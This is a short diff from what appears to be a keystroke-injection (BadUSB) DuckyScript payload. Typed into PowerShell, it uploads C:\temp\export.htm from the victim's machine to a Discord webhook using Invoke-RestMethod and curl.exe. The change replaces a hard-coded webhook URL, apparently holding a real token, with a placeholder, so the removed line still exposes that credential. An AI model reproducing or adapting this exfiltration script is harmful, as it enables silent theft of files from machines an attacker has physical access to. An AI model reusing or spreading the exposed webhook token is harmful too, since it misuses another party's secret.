@@ -37,5 +37,5 @@ STRING powershell
 ENTER
 DELAY 900
 REM Replace <WEBHOOK URL> with your URL
-STRING $file = 'C:\temp\export.htm';$url = "https://discord.com/api/webhooks/1059819241957773412/68iCYTlEdChwAJ2fjqXgbwQQD6UDnRooW5iZBRPH9cnw3K76yDfhcq2jSVBxbEwu-q9E";Invoke-RestMethod -Uri $url -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@$file" $url; exit
+STRING $file = 'C:\temp\export.htm';$url = "<WEBHOOK_URL>";Invoke-RestMethod -Uri $url -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@$file" $url; exit
 ENTER
